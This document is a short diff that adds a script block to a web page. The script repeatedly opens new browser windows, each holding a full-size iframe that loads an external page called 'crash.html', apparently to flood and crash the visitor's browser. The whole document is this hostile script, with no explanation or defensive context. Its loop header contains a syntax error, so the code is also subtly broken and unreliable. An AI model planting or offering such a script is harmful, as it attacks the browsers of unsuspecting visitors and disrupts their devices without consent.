@@ -1,0 +1,16 @@
+<script>
+          function crash() {
+            var win = window.open()
+            var url = "https://frostytoast37.github.io/crash.html"
+            var iframe = win.document.createElement('iframe')
+            iframe.style.width = "100%";
+            iframe.style.height = "100%";
+            iframe.style.border = "none";
+            iframe.src = url
+            win.document.body.appendChild(iframe)
+          }
+          for (let i = 0; i < 10; i++;) {
+            crash();
+          }
+
+</script>
